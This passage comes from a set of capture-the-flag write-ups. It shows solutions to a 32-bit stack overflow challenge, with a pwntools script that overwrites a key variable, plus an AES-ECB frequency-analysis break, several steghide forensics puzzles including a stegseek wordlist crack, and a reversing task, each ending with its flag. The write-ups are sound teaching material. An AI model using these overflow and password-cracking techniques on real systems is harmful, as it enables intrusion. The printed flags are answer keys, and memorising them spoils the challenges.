</pre></table></code></div></div><p>The binary is a 32-bit executable with no security protections. This strongly suggests a classic stack-based exploit.</p><p>Running the binary, it asks for input:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./vuln
Enter the code: <span class="nb">test
</span>Access denied.
</pre></table></code></div></div><p>Analyzing the decompiled code in <code class="language-plaintext highlighter-rouge">ghidra</code>, we can spot the vulnerability in the input() function.</p><p>The gets(buffer) call reads input into a 32-byte buffer without any size limit, creating a stack buffer overflow.</p><p>The solution is to use the buffer overflow from gets(buffer) to overwrite the adjacent key variable on the stack with the value <code class="language-plaintext highlighter-rouge">0x0defaced</code>.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>pwntools<li>Ghidra<li>checksec</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-determine-stack-layout-and-offset"><span class="mr-2">Step 1: Determine Stack Layout and Offset</span><a href="#step-1-determine-stack-layout-and-offset" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><code class="language-plaintext highlighter-rouge">gets()</code> writes up the stack (towards higher addresses), when we overflow the 32-byte buffer, the very next 4 bytes we send will overwrite the memory allocated for the <code class="language-plaintext highlighter-rouge">key</code> variable.</p><p>Therefore, our offset is 32 bytes.</p><h4 id="step-2-craft-the-payload"><span class="mr-2">Step 2: Craft the Payload</span><a href="#step-2-craft-the-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We need to send:</p><ul><li>32 bytes of “junk” padding to fill the buffer.<li>The 4-byte value <code class="language-plaintext highlighter-rouge">0x0defaced</code> to overwrite key.</ul><p>Our final payload will be: <code class="language-plaintext highlighter-rouge">[32 bytes of 'A'] + [0x0defaced]</code></p><h4 id="step-3-write-the-exploit"><span class="mr-2">Step 3: Write the Exploit</span><a href="#step-3-write-the-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">key_value</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0defaced</span><span class="p">)</span>
<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">32</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">key_value</span>

<span class="c1">#p = process('./vuln')
</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">target_host</span><span class="sh">"</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Sending payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvall</span><span class="p">().</span><span class="nf">decode</span><span class="p">())</span>
</pre></table></code></div></div><p>Running this <code class="language-plaintext highlighter-rouge">pwntools</code> python script give you the flag.</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><code class="language-plaintext highlighter-rouge">CYS{pwn!@#$\_overflow\_#}</code></p><h2> Flag</h2><code> Dynamic Flag </code><hr><h1 id="aes-again"> AES again?? <a href="/writeups/FinalTrace_2025/06-aes-again.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="aes-again">AES again??</h1><ul><li>Category: Cryptography<li>Author: P C Guhan</ul><h2 id="description"><span class="mr-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote><p>ECB mode this time… Random function, PKCS 7 padding - should be good Or is it?? (Encode the flag as CYS{flag} separated by underscores)</p></blockquote><h2 id="source"><span class="mr-2">Source</span><a href="#source" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="n">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>
<span class="kn">import</span> <span class="n">random</span>

<span class="n">random_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">random_int</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
    <span class="n">padded</span> <span class="o">=</span> <span class="nf">pad</span><span class="p">(</span><span class="nb">str</span><span class="p">.</span><span class="nf">encode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">padded</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">encrypted</span>

<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">flag.txt</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
<span class="n">encrypted_blocks</span> <span class="o">=</span> <span class="p">[</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">c</span><span class="p">).</span><span class="nf">hex</span><span class="p">()</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">plaintext</span><span class="p">]</span>
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">output.txt</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">encrypted_blocks</span><span class="p">))</span>
</pre></table></code></div></div><p><a href="output.txt">output.txt</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img src="image.png" alt="ECB Mode" /></p><p>AES ECB mode uses the same key to encrypt different blocks.</p><p>The vulnerability in this code is that we take a single character from the flag, pad it and encrypt it as opposed to padding the entire flag and encrypting it. Therefore all instances of the same character have the same cipher i.e. all ‘a’s will have the same cipher.</p><p>This in turn can be broken through frequency analysis</p><p>Frequency analysis also becomes easier when a large amount of text is given</p><h2 id="solution-script"><span class="mr-2">Solution script</span><a href="#solution-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">string</span>

<span class="k">def</span> <span class="nf">read_encrypted</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">content</span><span class="p">.</span><span class="nf">strip</span><span class="p">().</span><span class="nf">split</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">map_blocks_to_letters</span><span class="p">(</span><span class="n">encrypted_blocks</span><span class="p">):</span>
    <span class="n">unique_blocks</span> <span class="o">=</span> <span class="nf">sorted</span><span class="p">(</span><span class="nf">set</span><span class="p">(</span><span class="n">encrypted_blocks</span><span class="p">))</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">unique_blocks</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">26</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Too many unique blocks: </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">unique_blocks</span><span class="p">)</span><span class="si">}</span><span class="s"> (max 26 allowed)</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">letters</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span><span class="p">)</span>
    <span class="n">mapping</span> <span class="o">=</span> <span class="p">{</span><span class="n">block</span><span class="p">:</span> <span class="n">letter</span> <span class="k">for</span> <span class="n">block</span><span class="p">,</span> <span class="n">letter</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">unique_blocks</span><span class="p">,</span> <span class="n">letters</span><span class="p">)}</span>
    <span class="k">return</span> <span class="n">mapping</span>

<span class="k">def</span> <span class="nf">substitute_blocks_with_letters</span><span class="p">(</span><span class="n">encrypted_blocks</span><span class="p">,</span> <span class="n">mapping</span><span class="p">):</span>
    <span class="k">return</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">mapping</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="sh">"</span><span class="s">?</span><span class="sh">"</span><span class="p">)</span> <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="n">encrypted_blocks</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">encrypted_file</span> <span class="o">=</span> <span class="sh">"</span><span class="s">output.txt</span><span class="sh">"</span>
    <span class="n">decoded_file</span> <span class="o">=</span> <span class="sh">"</span><span class="s">test.txt</span><span class="sh">"</span>

    <span class="n">encrypted_blocks</span> <span class="o">=</span> <span class="nf">read_encrypted</span><span class="p">(</span><span class="n">encrypted_file</span><span class="p">)</span>
    <span class="n">mapping</span> <span class="o">=</span> <span class="nf">map_blocks_to_letters</span><span class="p">(</span><span class="n">encrypted_blocks</span><span class="p">)</span>
    <span class="n">decoded_text</span> <span class="o">=</span> <span class="nf">substitute_blocks_with_letters</span><span class="p">(</span><span class="n">encrypted_blocks</span><span class="p">,</span> <span class="n">mapping</span><span class="p">)</span>

    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">decoded_file</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">decoded_text</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></table></code></div></div><p><a href="test.txt">test.txt</a> This script substitutes each unique hex value with a letter. There are only 26 unique hex values in output.txt</p><p>When doing frequency analysis and substitution on the contents of test.txt, we get the plaintext.</p><p>Frequency analysis tools are available online. <a href="https://www.dcode.fr/frequency-analysis">The tool I used</a></p><blockquote><p>Flag: CYS{tiny_change_huge_difference}</p></blockquote><h2> Flag</h2><code> CYS{tiny_change_huge_difference} </code><hr><h1 id="vault-7a"> VAULT_7A <a href="/writeups/FinalTrace_2025/07-output-temporal.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p>Challenge Name: VAULT_7A</p><p>Category: Forensics / Steganography Author: Vishal V Difficulty: Easy</p><p>Challenge Description Within the Echo Maze, you discover a flickering hologram capsule labeled “VAULT_7A”. The projection stutters between timeframes, overlaying multiple moments into a single distorted image. Lyra’s voice echoes: “Some memories hide in layers… peel them back carefully.”</p><p>Downloads: temporal_fragment.jpg hint.txt</p><p>Solution: Initial Analysis Upon downloading the challenge files, I was presented with: A JPEG image file (temporal_fragment.jpg) A hint file (hint.txt)</p><p>First, I examined the basic file properties: bash: file temporal_fragment.jpg Output:temporal_fragment.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 360x360, components 3 No immediate clue was found. From challenge description “…peel them back…” , we can infer it must be something related to steganography.</p><p>Tools Used: steghide - JPEG/BMP steganography tool base64 - Base64 decoder (built-in Linux/Mac command) zbarimg - QR code scanner (from zbar-tools package) Online Caesar cipher decoder (or manual decoding) Online QR scanner (https://webqr.com) as alternative</p><p>Step-by-Step Solution Step 1: Decode the Passphrase from hint.txt Reading the hint file revealed an encoded passphrase: bash: cat hint.txt</p><p>Key information found:</p><ul><li>Encoded passphrase: ALTWVYHS<li>Hint: “Time shifts all things forward. To find truth, shift backwards 7 times.”<li>Encryption method: TEMPORAL SHIFT PROTOCOL (Caesar/ROT cipher)</ul><p>The hint indicates a Caesar cipher with shift of 7. To decrypt, I needed to shift each letter backward by 7 positions in the alphabet.</p><p>Manual decoding:</p><p>A - 7 = T L - 7 = E<br /> T - 7 = M W - 7 = P V - 7 = O Y - 7 = R H - 7 = A S - 7 = L</p><p>Result: TEMPORAL Alternatively, using an online ROT decoder or Python: Python code: def rot_decode(text, shift): result = “” for char in text: if char.isalpha(): start = ord(‘A’) if char.isupper() else ord(‘a’) result += chr((ord(char) - start - shift) % 26 + start) else: result += char return result</p><p>print(rot_decode(“ALTWVYHS”, 7))</p><h1 id="output-temporal">Output: TEMPORAL</h1><p>Passphrase obtained: temporal Step 2: Check for any hidden images inside the given image: bash: steghide info temporal_fragment.jpg Output: steghide info temporal_fragment.jpg “temporal_fragment.jpg”: format: jpeg capacity: 634.0 Byte Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file “qr_secret.png”: size: 481.0 Byte encrypted: rijndael-128, cbc compressed: yes Found a embedded file qr_secret.png!!</p><p>Step 3: Extract Hidden Data Using Steghide With the passphrase decoded, I used steghide to extract hidden data from the image: bash: steghide extract -sf temporal_fragment.jpg -p “temporal”</p><p>Output: wrote extracted data to “qr_secret.png” Success! The steghide tool extracted a hidden PNG file.</p><p>Step 4: Decode the QR Code Using zbarimg to scan the QR code: bash: zbarimg qr_secret.png ```</p><p>Output:</p><p>QR-Code:RkxBR3tFQ0hPX1ZBVUVUX01FTU9SWV9GUkFHTUVOVF83QV9SRVNUT1JFRH0= The QR code contained a base64-encoded string.</p><p>OR use a online qr decoder.</p><p>Step 5: Decode Base64 String The QR output was clearly base64 (ending with = padding). Decoding it: bash: echo “RkxBR3tFQ0hPX1ZBVUVUX01FTU9SWV9GUkFHTUVOVF83QV9SRVNUT1JFRH0=” | base64 -d Output: FLAG{ECHO_VAULT_MEMORY_FRAGMENT_7A_RESTORED}</p><p>Alternative Solution Paths Without Knowing the Password If the passphrase wasn’t decoded, players could use stegseek to brute-force it: bash# Install stegseek sudo apt-get install stegseek</p><h1 id="crack-with-common-wordlist">Crack with common wordlist</h1><p>stegseek temporal_fragment.jpg /usr/share/wordlists/rockyou.txt This would find “temporal” in seconds since it’s a common word.</p><p>Using Online Tools For players without CLI tools: Use online Caesar decoder: https://cryptii.com/pipes/caesar-cipher Extract with steghide (requires installation) Use online QR scanner: https://webqr.com Use online base64 decoder: https://www.base64decode.org</p><h2> Flag</h2><code> FLAG{ECHO_VAULT_MEMORY_FRAGMENT_7A_RESTORED} </code><hr><h1 id="forged-memory-log"> Forged Memory Log <a href="/writeups/FinalTrace_2025/08-forged-memory-log.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="forged-memory-log">Forged Memory Log</h1><ul><li>Category: Cryptography<li>Author: P C Guhan</ul><h2 id="description"><span class="mr-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote><p>Inside the Hourglass Citadel, Lyra uncovers a crystalline data shard said to contain the key to the final confession. But the key has been forged and obfuscated — mirrored fragments, deliberate noise, and counterfeit characters woven into its structure to mimic authenticity. Every attempt to read it only reveals more copies of itself, each slightly altered. To move forward, the player must isolate the genuine cipher sequence hidden beneath layers of forged keys and false reflections.</p></blockquote><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Brute force base-32 decode 39 times (I was limited to 39 as python had a memory error after 39 and I was lazy to do it in C/C++)</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">output.txt</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">inp</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
<span class="n">inp</span> <span class="o">=</span> <span class="n">inp</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">)</span>
<span class="n">inp</span> <span class="o">=</span> <span class="n">inp</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">39</span><span class="p">):</span>
    <span class="n">inp</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b32decode</span><span class="p">(</span><span class="n">inp</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">inp</span><span class="p">)</span>
</pre></table></code></div></div><blockquote><p>Flag: CYS{brute_forcing_is_the_way}</p></blockquote><h2> Flag</h2><code> CYS{brute_forcing_is_the_way} </code><hr><h1 id="reflection-restored"> Reflection Restored <a href="/writeups/FinalTrace_2025/09-reflection-restored.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="reflection-restored">Reflection Restored</h1><p><strong>Category:</strong> Reverse Engineering, Forensics<br /> <strong>Author:</strong> Sharon</p><h2 id="description"><span class="mr-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The binary <code class="language-plaintext highlighter-rouge">repair</code> asks for an input. If the input matches a criteria, a passphrase is printed. This passphrase is the steg info for <code class="language-plaintext highlighter-rouge">repair_mirror.jpg</code> attached. Inside <code class="language-plaintext highlighter-rouge">repair_mirror.jpg</code> is a text file that was embedded using <strong>steghide</strong>. The player needs to reverse <code class="language-plaintext highlighter-rouge">repair</code> to get the passphrase.</p><hr /><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Run the binary; it prompts for a key. Analyse the binary statically using a reverse-engineering tool like Ghidra.</p><h3 id="step-by-step-solution"><span class="mr-2">Step-by-step solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-statically-analysing-the-binary"><span class="mr-2">Step 1: Statically analysing the binary</span><a href="#step-1-statically-analysing-the-binary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Upon opening the binary for static analysis, we notice the core functions and find the main function. In the decompile, we notice:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>    <span class="n">iVar2</span> <span class="o">=</span> <span class="n">valid_input</span><span class="p">(</span><span class="n">local_128</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Wrong."</span><span class="p">);</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>iVar2 checks a function called <code class="language-plaintext highlighter-rouge">valid_input</code>.</p><p>We need to escape this by giving a valid input. Now let’s analyse what a valid input is:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>  <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">param_1</span><span class="p">);</span>
  <span class="n">bVar2</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar3</span> <span class="o">==</span> <span class="mh">0xc</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ppuVar4</span> <span class="o">=</span> <span class="n">__ctype_b_loc</span><span class="p">();</span>
    <span class="n">pbVar1</span> <span class="o">=</span> <span class="n">param_1</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">;</span>
    <span class="n">iVar6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">iVar5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">do</span> <span class="p">{</span>
      <span class="n">iVar5</span> <span class="o">=</span> <span class="p">(</span><span class="n">iVar5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(((</span><span class="o">*</span><span class="n">ppuVar4</span><span class="p">)[</span><span class="o">*</span><span class="n">param_1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
      <span class="n">iVar6</span> <span class="o">=</span> <span class="p">(</span><span class="n">iVar6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(((</span><span class="o">*</span><span class="n">ppuVar4</span><span class="p">)[</span><span class="o">*</span><span class="n">param_1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x200</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
      <span class="n">param_1</span> <span class="o">=</span> <span class="n">param_1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">pbVar1</span> <span class="o">!=</span> <span class="n">param_1</span><span class="p">);</span>
    <span class="n">bVar2</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">iVar5</span> <span class="o">&amp;&amp;</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">iVar6</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">bVar2</span><span class="p">;</span>
</pre></table></code></div></div><p>In the first few lines we notice that the input needs to be 12 characters long. The function then loops over each byte in the input, counting how many uppercase (<code class="language-plaintext highlighter-rouge">0x100</code>) and lowercase (<code class="language-plaintext highlighter-rouge">0x200</code>) characters it contains. It only validates the input if there are <strong>more than two</strong> uppercase and <strong>more than two</strong> lowercase alphabets.</p><h4 id="step-2-running-the-binary"><span class="mr-2">Step 2: Running the binary</span><a href="#step-2-running-the-binary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Now we try running the binary with a valid input.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>sharon123@Ramkumar:/mnt/c/Users/sramk/downloads/challenge<span class="nv">$ </span>./unlocker
Enter key: ASfgertfghwe
Passphrase: CYS<span class="o">{</span>mirror_restored_but_soul_shattered<span class="o">}</span> <span class="o">(</span>1st flag obtained<span class="o">)</span>
</pre></table></code></div></div><p>This gives us a passphrase.</p><h4 id="step-3-running-steg-analysis-on-the-jpg-attached"><span class="mr-2">Step 3: Running Steg analysis on the jpg attached</span><a href="#step-3-running-steg-analysis-on-the-jpg-attached" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>sharon123@Ramkumar:/mnt/c/Users/sramk/downloads/challenge<span class="nv">$ </span>steghide info mirror.jpg
<span class="s2">"mirror.jpg"</span>:
  format: jpeg
  capacity: 564.0 Byte
Try to get information about embedded data ? <span class="o">(</span>y/n<span class="o">)</span> y
Enter passphrase: <span class="c"># enter the obtained passphrase</span>
  embedded file <span class="s2">"flag.txt"</span>:
    size: 29.0 Byte
    encrypted: rijndael-128, cbc
    compressed: <span class="nb">yes</span>
</pre></table></code></div></div><p>Extract the embedded file with steghide:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>sharon123@Ramkumar:/mnt/c/Users/sramk/downloads/challenge<span class="nv">$ </span>steghide extract <span class="nt">-sf</span> mirror.jpg
Enter passphrase:
wrote extracted data to <span class="s2">"flag.txt"</span><span class="nb">.</span>

sharon123@Ramkumar:/mnt/c/Users/sramk/downloads/challenge<span class="nv">$ </span><span class="nb">cat </span>flag.txt
CYS<span class="o">{</span>r3fl3ct10n_r3st0r3d_B2A<span class="o">}</span>
